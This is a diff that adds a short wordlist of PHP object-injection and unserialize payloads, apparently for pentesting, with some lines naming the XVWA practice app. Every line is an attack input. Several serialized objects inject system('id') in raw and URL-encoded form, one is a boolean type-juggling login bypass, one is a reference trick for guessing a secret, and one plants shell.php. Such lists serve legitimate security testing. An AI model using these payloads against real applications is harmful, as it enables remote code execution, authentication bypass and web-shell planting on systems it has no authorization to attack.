@@ -1,0 +1,10 @@
+O%3A18%3A%22PHPObjectInjection%22%3A1%3A%7Bs%3A6%3A%22inject%22%3Bs%3A13%3A%22system%28%27id%27%29%3B%22%3B%7D
+O:18:"PHPObjectInjection":1:{s:6:"inject";s:13:"system('id');";}
+O:9:"PHPObject":2:{s:18:"PHPObjectpentest";s:0:"";s:6:"inject";s:13:"system('id');";}
+O%3A9%3A%22PHPObject%22%3A2%3A%7Bs%3A18%3A%22%00PHPObject%00pentest%22%3Bs%3A0%3A%22%22%3Bs%3A6%3A%22inject%22%3Bs%3A13%3A%22system%28%27id%27%29%3B%22%3B%7D
+a:2:{i:0;s:4:"XVWA";i:1;s:33:"Xtreme Vulnerable Web Application";}
+a:2:{s:8:"username";b:1;s:8:"password";b:1;}
+O:6:"Object":2:{s:10:"secretCode";N;s:4:"guess";R:2;}
+O:3:%22foo%22:2:{s:4:%22file%22;s:9:%22shell.php%22;s:4:%22data%22;s:5:%22aaaa%22;}
+a:1:{s:4:"Test";s:17:"Unserializationhere!";}
+O:8:"stdClass":3:{s:3:"aaa";a:5:{i:0;i:1;i:1;i:2;i:2;s:50:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA11111111111";i:3;i:4;i:4;i:5;}s:3:"aaa";i:1;s:3:"ccc";R:5;}';
